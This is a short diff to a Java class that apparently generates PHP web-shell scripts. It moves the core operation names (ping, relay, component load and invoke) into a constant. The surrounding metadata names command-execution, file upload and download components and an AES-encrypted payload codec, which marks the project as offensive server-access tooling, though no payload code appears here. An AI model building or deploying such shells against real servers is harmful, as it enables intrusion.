@@ -39,6 +39,8 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
     private static final String OUTPUT_PORTABLE = "portable";
     private static final String REQUEST_SENTINEL = "__LEO_REQUEST_FRAGMENT__";
     private static final String RESPONSE_SENTINEL = "__LEO_RESPONSE_FRAGMENT__";
+    private static final List<String> CORE_OPERATIONS = List.of(
+            "PING", "RELAY", "COMPONENT_LOAD", "COMPONENT_INVOKE");
     private static final List<String> DEFAULT_COMPONENTS = List.of(
             "BasicInfoComponent", "ExecCommandComponent", "ExecCommandSimpleComponent", "FileComponent",
             "FileDownloadComponent", "FileUploadComponent", "ExecScriptComponent",
@@ -66,7 +68,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("payloadCodec", "php-json-gzip-aes-cbc");
         metadata.put("trafficLayer", "opaque-bytes");
         metadata.put("coreProtocol", "Envelope");
-        metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
+        metadata.put("coreOperations", CORE_OPERATIONS);
         metadata.put("outputModes", List.of(OUTPUT_COMPACT, OUTPUT_PACKED, OUTPUT_PORTABLE));
         metadata.put("defaultOutputMode", OUTPUT_COMPACT);
         metadata.put("components", DEFAULT_COMPONENTS);
@@ -160,7 +162,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("payloadCodec", "php-json-gzip-aes-cbc");
         metadata.put("trafficLayer", "opaque-bytes");
         metadata.put("coreProtocol", "Envelope");
-        metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
+        metadata.put("coreOperations", CORE_OPERATIONS);
         metadata.put("outputMode", outputMode);
         metadata.put("components", components);
         metadata.put("componentDeliveryMode", "on-demand-disk-cache");
